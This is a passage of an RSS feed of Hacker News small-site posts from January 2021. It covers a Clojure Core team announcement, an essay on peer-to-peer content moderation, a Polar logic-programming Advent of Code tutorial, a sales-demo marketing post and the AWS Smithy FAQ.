could be! You can also listen to <a href="https://www.thedetechtor.com/podcast/episode/3244d976/hyperloop-is-it-the-future-of-travel" target="_blank" rel="noopener"><u>Episode 2 of The Detechtor Podcast</u></a> where we discuss the Hyperloop, and whether it's the future of travel?</span></p><h3 id="viewer-5cmp0"><span><span>More from The Detechtor:</span></span></h3><ul><li id="viewer-cg02b"><p><span>üè≠ </span><a href="https://www.thedetechtor.com/post/carbon-capture-usage-and-storage-the-solution-to-the-climate-crisis" target="_blank" rel="noopener"><u><strong>Carbon Capture, Usage and Storage: The Solution to the Climate Crisis?</strong></u></a></p></li><li id="viewer-97bdu"><p><strong>‚åöÔ∏è </strong><a href="https://www.thedetechtor.com/post/fitness-trackers-helping-us-get-fit-or-just-another-gadget" target="_blank" rel="noopener"><strong><u>Fitness Trackers: Helping us Get Fit or Just Another Gadget?</u></strong></a></p></li><li id="viewer-ai6pm"><p><strong>üì± </strong><a href="https://www.thedetechtor.com/post/smartphones-the-true-cost-of-upgrades" target="_blank" rel="noopener"><strong><u>Smartphones: The True Cost of Upgrades</u></strong></a><strong> ‚ôªÔ∏è</strong></p></li></ul><h3 id="viewer-epklr"><span><span>Stay updated:</span></span></h3><ul><li id="viewer-4uc6o"><p>üì© Want the latest on the impact of tech? <a href="http://thedetechtor.com/subscribe" target="_blank" rel="noopener"><strong><u>Subscribe</u></strong></a> to our <a href="http://thedetechtor.com/subscribe" target="_blank" rel="noopener"><strong><u>newsletter</u></strong></a>!</p></li><li id="viewer-1qfk"><p>üéô <strong>NEW</strong>! <a href="http://thedetechtor.com/" target="_blank" rel="noopener"><u>The Detechtor Podcast</u></a> is now available on all podcast players!                                 <strong>Subscribe</strong> on <a href="https://podcasts.apple.com/fr/podcast/the-detechtor-podcast/id1537457578?l=en" target="_blank" rel="noopener"><u>Apple Podcasts</u></a> | <a href="https://open.spotify.com/show/5kc8WA6nZC69bQ1sbOrlNi?si=CwAuAtpfRpe7WmLu1PlO8w" target="_blank" rel="noopener"><u>Spotify</u></a> | <a href="https://podcasts.google.com/search/The%20detechtor%20Podcast" target="_blank" rel="noopener"><u>Google Podcasts</u></a> | <a href="https://www.stitcher.com/show/the-detechtor-podcast" target="_blank" rel="noopener"><u>Stitcher</u></a> | <a href="https://tunein.com/podcasts/Technology-Podcasts/The-Detechtor-Podcast-p1377296/?topicid=158813573" target="_blank" rel="noopener"><u>Tunein</u></a></p></li><li id="viewer-du0kr"><p>üì≤ Let's connect! <strong>Follow</strong> <strong>us</strong> on <a href="https://twitter.com/the_detechtor" target="_blank" rel="noopener"><u>Twitter</u></a> | <a href="https://www.instagram.com/thedetechtor/" target="_blank" rel="noopener"><u>Instagram</u></a> | <a href="https://www.facebook.com/thedetechtor" target="_blank" rel="noopener"><u>Facebook</u></a> | <a href="https://www.youtube.com/channel/UCAW--4_mML4A86W3670ix3w" target="_blank" rel="noopener"><u>Youtube</u></a></p></li></ul></div></div></div></div></article></div></div>]]>
            </description>
            <link>https://www.thedetechtor.com/post/first-hyperloop-passenger-test</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794813</guid>
            <pubDate>Fri, 15 Jan 2021 19:05:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Clojure Core]]>
            </title>
            <description>
<![CDATA[
Score 165 | Comments 40 (<a href="https://news.ycombinator.com/item?id=25794739">thread link</a>) | @tosh
<br/>
January 15, 2021 | http://blog.fogus.me/2021/01/15/clojure-core/ | <a href="https://web.archive.org/web/*/http://blog.fogus.me/2021/01/15/clojure-core/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="body">

                <div id="post-6729">
                 <h3><a href="http://blog.fogus.me/2021/01/15/clojure-core/" title="Clojure Core">Clojure Core</a></h3>
                 <p><span>Jan 15, 2021 </span></p><p>Earlier today Rich Hickey let the cat out of the bag that <a href="https://twitter.com/richhickey/status/1350110634776657920">I‚Äôm joining the Clojure Core</a> development team.</p>

<blockquote data-width="500" data-dnt="true"><p lang="en" dir="ltr">We are excited to welcome <a href="https://twitter.com/fogus?ref_src=twsrc%5Etfw">@fogus</a>, long-time Clojure contributor and co-author of Joy of Clojure, to the Clojure core team!</p>‚Äî Rich Hickey (@richhickey) <a href="https://twitter.com/richhickey/status/1350110634776657920?ref_src=twsrc%5Etfw">January 15, 2021</a></blockquote>

<p>This is a change from my previous relationship with the Clojure Core team that in the past few years has been sporadic at best. This circumstance arose through necessity rather than desire and so I‚Äôm overjoyed to work closely with the team once again. Over the past few years <a href="https://twitter.com/puredanger">Alex Miller</a> has exerted a Herculean effort in shepherding the language through numerous versions and steady growth. I‚Äôm overjoyed to be given the opportunity to join him in helping push the language forward, and I‚Äôll do my very best to avoid breaking everything.</p>

<p>So what this means is that I‚Äôll be far more visible<sup id="fnref:v"><a href="#fn:v" rel="footnote">1</a></sup> in and around the Clojure ecosystem while spending my time thinking about Clojure more so than just using Clojure.<sup id="fnref:cljs"><a href="#fn:cljs" rel="footnote">2</a></sup></p>



            </div>
            <!-- end comments_wrapper -->            </div></div>]]>
            </description>
            <link>http://blog.fogus.me/2021/01/15/clojure-core/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794739</guid>
            <pubDate>Fri, 15 Jan 2021 19:00:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Probablistic P2P Content Moderation]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25794562">thread link</a>) | @chasingsparks
<br/>
January 15, 2021 | https://generativist.falsifiable.com/metaverse/probablistic-p2p-content-moderation | <a href="https://web.archive.org/web/*/https://generativist.falsifiable.com/metaverse/probablistic-p2p-content-moderation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><a href="https://generativist.falsifiable.com/">generativist</a> / <a href="https://generativist.falsifiable.com/metaverse/">metaverse</a>
    <hr>
    
    
    <p>Propagation is a Liberating Constraint In The Accoustic Space</p>
    <time datetime="2021-01-15 00:00:00 +0000 UTC">2021-01-15</time>
    <section>
        <figure><img src="https://p.falsifiable.page/zQmWmQdZiLAGFm912VRAweUQogjNeXA8GNTGBdn1nXXzewS" alt="A mesh network"></figure><hr>

<blockquote>
<p>Ours is a brand new world of allatonceness. ‚ÄúTime‚Äù has ceased. ‚ÄúSpace‚Äù has vanished. We now live in a global village‚Ä¶a simultaneous happening. We are back in accoustic space. We have begun again to structure the primordial feeling, the tribal emotions from which a few centuries of literacy divorced us. We have had to shift our stress of attention from action to reaction. [‚Ä¶] Electronic circuitry profoundly involves men with one another. Information pours upon us, instantaneously and continuously. Our electrically configured world has forced us to move from the habit of data classification to the mode of pattern recognition. We can no longer build serially, block-by-block, step-by-step, because instant communication insures that all the factors of the environment and of experience coexist in the state of active interplay.</p>

<p>‚Äì <a href="https://amzn.to/38M7C3Z">The Medium Is The Message</a>. McLuhan &amp; Fiore (1967, p. 63)</p>
</blockquote>

<hr>
<h2 id="start-with-a-goal-of-synthesis">Start With A Goal of Synthesis</h2>
<p>In my last post I argued that <em>what comes next</em> should be an <a href="https://generativist.falsifiable.com/metaverse/what-should-social-look-like">emphemeral-by-default, peer-to-peer, algorithmically-augmented</a> social medium. A while before that, I started focusing on a different question: <strong>how can we build a medium that can synthesize twitter‚Äôs capabilities, albeit peer-to-peer</strong>.<label for="sn-0"></label><span>The data used in <a href="https://generativist.falsifiable.com/metaverse/dunbars-number-is-quadratic">Dunbar‚Äôs Number Is Quadratic</a> was originally collected for that purpose. It was merely a convenient sample that I already had for that post.</span> I can‚Äôt answer this question in a single post. More than that, I don‚Äôt think I can answer it alone. But, I think it‚Äôs useful to start by thinking about messages and their propagation.</p>

<p>Carving away extraneous detail, tweets are the atoms of the twitter universe. They bind a blob of content to an identity at a particular time. Likes and retweets are time and identity bound pointers to tweets. They socially allocate attention without content creation. Quote tweets, replies, and quoted replies are compounds. They bind a blob of content <em>and</em> a pointer (or two) to an identity at a particular time. Ignoring time and identity, these foundational interactions look like,</p>
<figure><img src="https://p.falsifiable.page/zQmdC81odYejoG8GBKzaf44AxxbzBGiohrX8hiT6AUWuDcV" alt=""></figure><p>But, that is not the whole story. They joy of the medium is how users weave these interactions into a tapestry. Thus, if you want to synthesize twitter with P2P distribution, you can‚Äôt only consider atomic message exchange. You need to think about sub-graph collation and propagation, too. Measured in bytes, these may not be large objects. But, measured in milliseconds, latency can add up quickly ‚Äì and <strong>latency matters a lot</strong>.</p>
<h2 id="sharing-subgraphs">Sharing Subgraphs</h2><p>Assume each foundational interaction (message) has a unique content hash.<label for="sn-1"></label><span>Assuming cryptographic hash functions and messages with timestamps and (optional?) nonces, this is an easy assumption to satisfy. Since the pointers are also covered by the hash function, there is also a block chain/graph structure for some messages. But I don‚Äôt think this should work via consensus (baring deliberate commits to a global ledger). My mental image is more like a soup of memes as unbound proteins.</span> The P2P network allows you to query for hashes and the associated content. The actual content includes a reference to the users identity as well as a cryptographic signature of the message.<label for="sn-2"></label><span>The signature signs the hash, so it‚Äôs not technically part of the message that gets digested. It‚Äôs just stored and shared as a sibling of the content.</span> Each node maintains a small subset of this data, conditional upon user and algorithmic requirements.</p>
<p>You have both the content <span>\(c_0\)</span> and its associated hash <span>\(f(c_0)\)</span>. The content-associated identity allows you to connect to the author or their delegated proxy. Where squares refer to the identity (identitical in this case), you have the following thread,<label for="sn-3"></label><span>I‚Äôm using threads because they are the easiest to reason about, not because they are the only sub-graph shape.</span></p>
<figure><img src="https://p.falsifiable.page/zQmUhvHLzEddXnMv5mpVV6P5RpvEdwpwDeJPm4gVa1QP6hL" alt=""></figure><p>If the protocol supports an action like <code>retrieve_subgraph(c)</code> and you are connected to <span>\(u_0\)</span>, this is an <span>\(O(1)\)</span> operation.</p>

<p>Now consider the following thread,</p>
<figure><img src="https://p.falsifiable.page/zQmZyTHaMBUrp67x2J2RXbU2LZ91Jk1pLrj5cq7LH3Loqeu" alt=""></figure><p>What happens when you call <code>retrieve_subgraph(c)</code> for <span>\(c_0\)</span> on <span>\(u_0\)</span>?</p>

<p>In the ideal case, <span>\(u_0\)</span> returns the entire thread in <span>\(\mathcal{O}(1)\)</span>. Because messages are signed and contain pointers the relevant parents, authenticity of the result is cryptographically assured. However, if <span>\(u_0\)</span> is is unaware of some inbound references or it has evicted them from its persistent stores and ephemeral buffers, the resulting view is incomplete in <span>\(\mathcal{O}(1)\)</span>.</p>

<p><strong><em>This incompleteness is not a bad thing.</em></strong> Two cases illustrate why,</p>

<ul>
<li><p><em>Abuse</em>: If <span>\(c_1\)</span> is abusive content replying to <span>\(c_0\)</span>,  <span>\(u_0\)</span> is under no obligation to propagate it. <span>\(u_0\)</span> created the context; they are in the best situation to moderate it.</p></li>

<li><p><em>Indirect Criticism</em>: If <span>\(c_0\)</span> is in some way bad and <span>\(u_1\)</span> wants to comment on it without provoking <span>\(u_0\)</span> or their followers,<label for="sn-4"></label><span>Screenshot tweets on twitter smell like a missing feature. But, I think there should be something like a detatched-head flag because I would probably let my agent filter out most of these interactions. I‚Äôd disable screenshot tweets if I could.</span> <span>\(u_1\)</span> is under no obligation to notify <span>\(u_0\)</span>.</p></li>
</ul>

<p>In the case of abuse, subscribers of <span>\(u_0\)</span> and not <span>\(u_1\)</span> benefit from the failure to propagate. Alternatively, subscribers of both are in the best position to evaluate and mediate (or ignore) the possible conflict. In the case of indirect criticism, the often self-perpetuating collision between identities and cliques is less likely to occur.</p>
<h2 id="incompleteness-is-structure">Incompleteness is Structure</h2><p><strong>This local incompleteness does not imply inaccessibility</strong>. For example,  consider the simple case where <span>\(u_0\)</span> flushed its ephemeral buffers and chose not to retain the rest of the chain.</p>

<ul>
<li><p>If the requester exhaustively queried each user on the graph, the cost of achieving completion would be a burdensome <span>\(\mathcal{O}(n)\)</span>.<label for="sn-6"></label><span>More likely, they would rely on a content accelerator intermediary. However, I assume those nodes augment the ecosystem at an additional cost to either the person making the query or the content producer, preserving incentives.</span> Unconditional queries are decidedly not social.</p></li>

<li><p>If the requestor queried users in proportion to prior interaction frequencies ‚Äì and if nodes retained messages in proportion to time and interaction frequencies ‚Äì the upper-bound is still <span>\(n\)</span>. However, <em>the expected time until completion is much, much lower, as a property of the interaction graph</em>. Interaction proportional queries are inherently social.<label for="sn-7"></label><span>This argument works for propagation by gossip, too.</span></p></li>
</ul>

<p>Now, assume there is a maximum cost threshold for queries. This may be explicitly programmed or implicitly generated as a function of latency, which users robustly do not tolerate.<label for="sn-8"></label><span>The argument still works for gossip distribution assuming user‚Äôs have finite resources and want to dedicate the minimum sufficient amount. This is a bit hand-wavy, but go on-board for <a href="https://scuttlebutt.nz/">SSB</a> and you‚Äôll have a more visceral sense of how this is a useful constraint.</span> Assuming the heterogeneity of BYO algorithms and interfaces, this distribution does not lend itself to easy analysis. <em>That is a good thing!</em> The ragged landscape resists easy exploitation and manipulation. However, we can say something critical about the induced pressure ‚Äì <strong>the probability of observing a message becomes a function of social peers willingness to propagate it.</strong></p>

<p>Whether by algorithm or explicit action, this structure allows users to engage in both amplification and <em>attenuation</em>.  These probabilistic boundaries can be rendered sharper given the addition of inhibiting signals ‚Äì mutes and blocks operating at the level of either identity <em>or content</em>, functioning as something like antigens.<label for="sn-5"></label><span>I‚Äôm extremely biased here. After I finished my Ph.D. on belief systems and how they socially break down, I started working on a computational immune system for twitter via the API. Ignoring my conclusion ‚Äì <a href="https://generativist.falsifiable.com/metaverse/where-did-the-future-go">that I was building a sand castle on someone‚Äôs private beach</a> ‚Äì the API restricts made it extremely coarse. A lot of my motivation now is in making sure it‚Äôs possible on what comes next.</span> The willingness to accept or ignore one of these attestations of harm is at the discretion of the user. Boundary spanners may ignore them or implement time decay, facilitating social graph healing. Those more vulnerable may enforce them rigorously, warding off harms. But, in both cases, <a href="https://generativist.falsifiable.com/metaverse/centralized-social-partitions-considered-harmful">these boundaries are subject to continuous (re-)negotiation, rather than punctuated and durable ruptures</a>.</p>
<p>The result is socially-shaped content propagation.<label for="sn-9"></label><span>You can go even further and have nodes that propagate some messages to only some people. It‚Äôs a common social behavior. I think <a href="https://en.wikipedia.org/wiki/Google%2B#Circles">Circles</a> didn‚Äôt work because it was too rigid and effortful. But probablistic and conditional delivery is a huge opportunity.</span>  The decision not to propagate <em>is</em> a form of censorship. But, <strong>it exists at something like the maximum margin between freedom of speech and freedom of reach.</strong> Your time and attention are finite. The social graph structures it in useful ways. You need not abdicate your responsibilities and deliberation; but, you can collaborate for the purpose of socially-allocated attention.</p>
<h2 id="next-steps">Next Steps</h2><p>The great power of social media is discovery. Social discovery depends on,</p>

<ol>
<li>The willingness of inter-mediating paths to propagate a message;</li>
<li>The existence of ancillary curation services;</li>
<li><strong>The ability of peers to connect to each other or by proxy quickly</strong></li>
</ol>

<p>I‚Äôm confident that (1) is not only viable, but the fundamental solution. I also believe (2) is a useful out-of-core service, that helps with heterogeneity and ensures the platform can evolve. The big issue is (3). Last year, I started building a platform to fill exactly this gap, but I set it aside. Now, it‚Äôs time to pick it back up. <strong>If you have expertise in building cryptographic distributed systems, I do want to hear from you.</strong> In the meantime, I‚Äôm going continue doing ground work including building ‚Ä¶</p></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://generativist.falsifiable.com/metaverse/probablistic-p2p-content-moderation">https://generativist.falsifiable.com/metaverse/probablistic-p2p-content-moderation</a></em></p>]]>
            </description>
            <link>https://generativist.falsifiable.com/metaverse/probablistic-p2p-content-moderation</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794562</guid>
            <pubDate>Fri, 15 Jan 2021 18:48:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advent of Code in Polar (logic programming)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25794536">thread link</a>) | @saolsen
<br/>
January 15, 2021 | https://www.osohq.com/post/advent-of-code-in-polar | <a href="https://web.archive.org/web/*/https://www.osohq.com/post/advent-of-code-in-polar">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
<h3>What is Polar</h3>
<p>The oso policy language, Polar, is designed to be good for writing authorization policies. Many of the choices made optimize for that use case. Things like its logic-based nature, pattern-matching specializers and how easy it is to interoperate with the host language's objects are all meant to make it easy to write policies over your existing data to make authorization decisions. But Polar isn't just for authorization, it's actually a fully general purpose language, a close relative of Prolog, and should be powerful enough for any computing task.</p>
<p>It's a good exercise to try and write programs in Polar that are more complicated than your average authorization rule set. Previously we even <a href="https://www.osohq.com/post/polar-adventure">implemented an entire game in Polar</a>. Using Polar in new and different ways teaches us a lot about the language and its rough edges.</p>
<h3>Why advent of code</h3>
<p><a href="https://adventofcode.com/">Advent of code</a> is a fun series of programming puzzles that are published every day from December 1st to December 25th. I've been a big fan of advent of code for a while and it has been a tool I've used to get better at programming. It's especially useful to me to try out a new language I'm learning. I did advent of code in Rust a few years ago when I was just getting started, and it really helped accelerate how fast I got the hang of things having to solve a bunch of different kinds of problems. I thought that this year I could do the same thing for Polar, and use advent of code to really see what it could do.</p>
<p>I have to admit I haven't finished all the problems yet but I've learned a ton about Polar, both good and bad in the process. I've clarified to myself a bunch of patterns that show up when writing Polar programs, found some rough edges in the language that we can clean up, and come up with some features that could help Polar in the future.</p>
<h2>Common Programming Patterns With Polar</h2>
<h3>Loops and Recursion</h3>
<p>Many times when solving a problem you need to iterate over a data structure. In the cases where this came up in advent of code it was usually a list. Polar has three ways to deal with lists: <code>in</code>, <code>forall</code>, and recursion.</p>
<p><code>in</code> is an operator that binds a variable to every member of a list. It can be used for membership checks, and can be combined with another expression to make a filter: <code>x in [1,2,3] and x &gt;= 2</code>.</p>
<p><code>forall</code> is an operator that succeeds if everything within it succeeds. <code>forall</code> is usually combined with <code>in</code> to check if a condition is true for every element in a list: <code>forall(x in [1,2,3], x &lt; 10)</code>.</p>
<p>If however you need to process a list element by element and combine the values in some way, you need to use list destructuring and recursion. We can do that with rules that match on a list with a rest variable. The <code>[first, *rest]</code> specializer matches a list and binds the first element to <code>first</code> and the rest of the list to <code>rest</code>.</p>
<p>Lets say you have a list of numbers and you want to sum them. There are two ways you can write this in Polar. This first way recursively goes down the list until it hits the base case (the empty list <code>[]</code>) and then builds back up the answer. </p>
<pre><code>sum([], 0);
sum([first, *rest], ans) if
    sum(rest, rest_ans) and
    ans = rest_ans + first;
</code></pre>

<p>The other way to write it is like this:</p>
<pre><code>sum([], ans, ans);
sum([first, *rest], prev_ans, ans) if
    this_ans = first + prev_ans and
    sum(rest, this_ans, ans);
sum(lst, ans) if sum(lst, 0, ans);
</code></pre>

<p>The differences here are subtle but important. In the first example you recurse down to the base case and then build up the result. In the second example you pass the intermediate result down to the next level and then bind the result var once you hit the base case.</p>
<p>The first one seems like it's a little simpler (it's less lines of code after all) but the second one should actually be preferred. It's an iterative recursive algorithm and can be thought of as a loop. The recursive call is the last thing in the rule which makes this a tail call and we can optimize this kind of recursion so that the stack doesn't grow. We are planning to implement this kind of optimization and have an <a href="https://github.com/osohq/oso/issues/641">issue</a> that you can vote on if it's import to your use cases.</p>
<p>Blowing the stack was something that happened a lot in my work on these problems. Tail call optimizations are something we need to add and when we do the second example will work even on very large arrays.</p>
<p>Another thing this pattern shows is how you can set up a recursive rule with two definitions: one that's the base case, and one that's the recursive case. Being able to lay these out with specializers I think makes it easy to see what's happening. When you have to add intermediate values to your recursive rules you can simply wrap the whole thing in a helper that sets up the default values and calls it directly for a list.</p>
<h3>Function Calls</h3>
<p>Polar rules don't work the same as functions in other languages. There is no return value; they simply specify relationships between variables and the rule succeeds or it doesn't. Sometimes (lots of times) you want to calculate something with a rule and get an answer out. In these cases you can use a function call pattern.</p>
<pre><code>add(a, b, answer) if answer = a + b;
</code></pre>

<p>You can simply pass another variable to a rule that will get bound to the result. This is something you get very comfortable with after writing Polar for a while, but can be confusing the first time you see logic programming.</p>
<h3>Helper functions</h3>
<p>Polar doesn't have a lot of builtin functions for operating on values. Lots of the power of Polar is that you can easily use host language objects and methods. For some problems if I needed something like a math function that wasn't defined in Polar I could easily set up a helper class with that method from Python and use it in Polar.</p>
<pre><code>class Lib:
    @staticmethod
    def cos(f):
        return Math.cos(f);

oso.register_constant(Lib, "Lib")
</code></pre>

<pre><code>cos(f, ans) if ans = Lib.cos(f);
</code></pre>

<h3>Inline Queries</h3>
<p>Polar has syntax for specifying an inline query, which is run when a Polar file is loaded and will throw an error if it doesn't succeed. I used these extensively for unit tests when doing advent of code problems.</p>
<pre><code>add(a, b, ans) if ans = a + b;

?=add(1,2,3);
?=not add(1,2,4);
</code></pre>

<h3>If / Else</h3>
<p>A Polar rule either succeeds, or it fails. If it fails, it backtracks and doesn't evaluate any more terms in the current branch. But sometimes you want to check if some condition is true, and do one thing if it is and another if it isn't. In most languages this would be an <code>if</code> / <code>else</code> branch. In polar you can do an equivalent thing with <code>or</code> and <code>cut</code>. The <code>or</code> sets up a choice point and the <code>cut</code> eliminates the untaken branch.</p>
<pre><code>(
    check_something() and
        then_block() and cut
) or (else_block());
</code></pre>

<h3>Case / Match statements</h3>
<p>Sometimes you have a value and you want to do different things depending on what the value is. In other languages this could be a switch statement, a match statement or even a big chain of <code>if</code> / <code>else if</code>/ <code>else</code> blocks. In Polar the best way to do these are with individual rules and specializers. This came up a lot in advent of code (as you'll see soon) and results in some really nice looking code.</p>
<h2>Places where Polar was a great fit</h2>
<p>Day 4 was one of my favorites to write in Polar. It's a great fit for the language. I had a list of inputs and a list of rules the inputs had to satisfy to be valid. This is very similar to a policy so I could write out the rules in Polar and evaluate them.</p>
<p><a href="https://gist.github.com/saolsen/114e4a8fca950cf143ff1924f13629a3">https://gist.github.com/saolsen/114e4a8fca950cf143ff1924f13629a3</a></p>
<p>Day 8 was my favorite of them all. I had to implement a little virtual machine. This included many of the patterns I spoke about above: using helpers from Python (in this case list indexing), the <code>if</code>/  <code>else</code> block pattern, and having rules for the individual operations:</p>
<pre><code>op("acc", arg, acc, i, next_acc, next_i) if next_i = i+1 and next_acc = acc+arg;
op("jmp", arg, acc, i, acc, next_i) if next_i = i+arg;
op("nop", _, acc, i, acc, next_i) if next_i = i+1;
</code></pre>

<p>The best part of day 8 was on part two where I had to take the program (the input) and find a version where a single instruction was swapped to a different one that made the program terminate. Without the swap the program will enter into an infinite loop. In Polar I can simply evaluate the program as usual but when I hit one of the swappable instructions, evaluate it swapped and not swapped. If I detect that that the program is looping, the query fails (and backtracks) and this way I can search the whole state of possible programs.</p>
<p><a href="https://gist.github.com/saolsen/df640e94933ead78da501da175249194">https://gist.github.com/saolsen/df640e94933ead78da501da175249194</a></p>
<h2>Places where Polar was a bad fit</h2>
<p>There were also some rough edges I hit.</p>
<h3>Counting successes</h3>
<p>A Polar rule either succeeds or fails. In a lot of cases I wanted to count the number of successes of a rule. For instance in a list of items, how many of them pass a rule? We have <code>forall</code> to see if all of them succeed, but no way to see how many succeed right now. You have to recurse over the list yourself and count as you go. There are some Prolog predicates that exist for this kind of thing ( <code>bagof</code> / <code>setof</code> / <code>findall</code> ) that we might consider adding to Polar.</p>
<h3>List operations</h3>
<p>There are many things you might want to do with lists that aren't built in. The only real built-in tool that you have is destructuring, which lets you pull items off the head and place items onto the head of lists. These operations are based on Lisp-style <code>cons</code> cells, where those are the only efficient operations. All other operations, like appending lists together, getting the nth element, or counting the length, etc have to be done with recursive rules, which adds to the complexity of the algorithm.  Polar represents lists internally as Rust vectors, not cons cells, so we could add builtins for other operations like getting the length, or appending to the end, or pulling out slices. There were many different days where any or all of these would have been useful, but I had to implement them as helpers in Python.</p>
<h3>Large searches</h3>
<p>Our defaults for stack size limit and timeouts for running a query are set small because ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.osohq.com/post/advent-of-code-in-polar">https://www.osohq.com/post/advent-of-code-in-polar</a></em></p>]]>
            </description>
            <link>https://www.osohq.com/post/advent-of-code-in-polar</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794536</guid>
            <pubDate>Fri, 15 Jan 2021 18:46:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tips for an Interactive Sales Demo]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25794349">thread link</a>) | @sdneirf
<br/>
January 15, 2021 | https://remotehq.co/3oOgzzc | <a href="https://web.archive.org/web/*/https://remotehq.co/3oOgzzc">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article data-v-4ec71bb5=""> <section data-v-4ec71bb5=""><div data-v-69a15e8e="" data-v-4ec71bb5=""><div data-v-69a15e8e="" data-v-4ec71bb5=""><p>In the 2021 work environment, sales demos continue to move &nbsp;online. There is little opportunity to have face to face demos or client meetings and teams have to adapt accordingly. Sales teams must learn how to create a personal experience for their potential clients virtually - having an interactive demo is vital. The virtual video call must parallel the warmth of an in person experience. Below are a few tips on how to have a more interactive sales demo. </p><p><strong>1. Use Shared Browser instead of screenshare.</strong></p><p>Screenshare is so 2020. <a href="https://remotehq.co/3i9xedO">Shared Browser</a> is a cloud-based browser that gives control to multiple participants. With RemoteHQ ‚Äòs Shared Browser, you can co-browse any URL. This makes the experience more interactive as your clients can move around the page and easily explore any site/deck you‚Äôre sharing. However, this is only if/when you want guests to have control and edit access - you can change the permissions of Shared Browser at any time. You can easily have different teammates take control and lead the conversation rather than awkwardly turning screen share on and off between everyone. Shared Browser moves the meeting along faster than screen share, helping you perform better. Learn more about the <a href="https://remotehq.co/3oIVLsQ">power of Shared Browser</a> on our blog. </p><p><strong>2. Make time for questions throughout the demo</strong></p><p>It‚Äôs important to make sure your potential customers are able to ask questions and fully understand what you‚Äôre selling. With the reactions feature on RemoteHQ, all participants can easily raise their hands virtually. When someone‚Äôs hand is raised, there will be an ‚úãicon next to their video tile and once they start speaking, the icon will automatically go away. This way, there is no need to interrupt. Reactions make it clear when there is a question, so you can see who has questions and pause accordingly. </p><p><strong>3. Interactive notes</strong></p><p>Having accessible and visible notes during a meeting helps keep everyone focused and on task. Having an agenda on the screen helps guide the conversation and move it along at the right pace. It also lets everyone know what‚Äôs coming up in the conversation. The notes app on RemoteHQ is quick to pull up and also saves into your session history, which you can send to all guests after the meeting. Having a virtual whiteboard for group brainstorming is also a plus for an interactive demo. &nbsp;</p><p><strong>4. Insert video</strong></p><p>Video has been proven to retain a consumer‚Äôs attention better than text. It‚Äôs more engaging and entertaining for the viewer to consume. On RemoteHQ, you can open up the YouTube app integration and play a video on a call. Or simply go to YouTube, Vimeo, TikTok, etc on Shared Browser for a seamless transition. </p><p><strong>5. Focus on the demo</strong></p><p>Let RemoteHQ do the heavy lifting. Turn on audio transcription and let RemoteHQ take notes for you. &nbsp;This allows you to focus on what is most important: Pitching to your prospect. At the end of your session everything that was said by all participants will be available to you. Easily copy and paste them into your CRM for a record of what happened. Throughout the demo, you can also sync your layout with everyone in the meeting whenever you move from different pages and apps - this important to keep clients on track and paying attention to what you want them to do. </p><p><a href="https://remotehq.co/2LNIUXz">Try it out</a> and see if these tips can help you on your next sales call! Learn about other features you didn‚Äôt know you needed in remote work on our <a href="https://remotehq.co/2XDLzWs">blog</a>. </p><p>Casey+RemoteHQ team</p></div></div></section></article></div>]]>
            </description>
            <link>https://remotehq.co/3oOgzzc</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794349</guid>
            <pubDate>Fri, 15 Jan 2021 18:34:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS Smithy: A language for defining services and SDKs]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25794213">thread link</a>) | @based2
<br/>
January 15, 2021 | https://awslabs.github.io/smithy/ | <a href="https://web.archive.org/web/*/https://awslabs.github.io/smithy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
            <h2>FAQs</h2>

            <h2>Why did you develop Smithy?</h2>
            <p>Smithy is based on an interface definition language that has been widely
                used within Amazon and AWS for over a decade. We decided to release Smithy
                publicly to let other developers use Smithy for their own services and
                benefit from our years of experience with building tens of thousands of
                services. By releasing the Smithy specification and tooling, we also hope
                to make it easier for developers to maintain open source AWS SDKs.</p>

            <h2>Does Smithy only work with AWS?</h2>
            <p>No. Smithy can be used with any kind of service. All AWS-specific metadata
                in Smithy is implemented as decoupled packages.</p>

            <h2>Why not just use an existing IDL?</h2>
            <p>At AWS, we rely heavily on metadata, code generation, service frameworks,
                client libraries, and automated policy enforcement. Existing IDLs
                available outside of AWS were not extensible enough to meet our needs
                and not compatible with our existing services.</p>

            <h2>How is Smithy different than other IDLs and frameworks?</h2>
            <p><strong>Smithy is built for code generation and tools.</strong>
                Smithy models were designed for the purpose of generating code for
                multiple programming languages. For example, Smithy models are
                completely normalized, which gives all generated types an explicit
                name and makes models easy to traverse, validate, and diff.</p>
            <p><strong>Smithy can be extended <em>and</em> constrained.</strong>
                Traits are used to extend a model and add capabilities that are not
                part of the core specification. For example, AWS defines AWS-specific
                traits that are used to generate other metadata documents that are
                derived from Smithy models. While extensibility is a key design
                requirement, Smithy provides a built-in validation system that
                ensures models adhere to a configurable set of rules and policies.</p>
            <p><strong>Smithy is protocol agnostic.</strong> Smithy decouples the
                transport layer of web services from the data structures and capabilities
                of the service so that they can evolve independently.</p>
            <p><strong>Smithy helps large organizations collaborate on APIs.</strong>
                Smithy allows different aspects of a model to be owned by different
                teams. We use this feature at AWS to allow the documentation teams
                to own API documentation, while service owners control the shape and
                operations of a service.</p>
            <p><strong>Smithy models can be altered for different audiences</strong>.
                Smithy's <em>projection</em> system allows the contents of a model to
                be filtered and changed based on who a particular build of a model is
